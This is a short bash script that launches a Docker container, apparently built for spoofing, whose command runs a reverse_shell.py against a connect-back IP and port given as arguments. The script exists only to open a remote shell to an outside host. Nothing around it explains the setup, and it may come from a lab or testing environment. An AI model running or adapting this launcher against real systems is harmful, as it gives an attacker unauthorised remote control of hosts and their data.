#!/bin/bash

connback_ip="$1"
connback_port="$2"

hostname="spike"
imagetag="spoofing:1.0.0"
cmd="python3 /usr/lib/reverse_shell.py -a $connback_ip -p $connback_port"

docker run -h $hostname --rm $imagetag $cmd
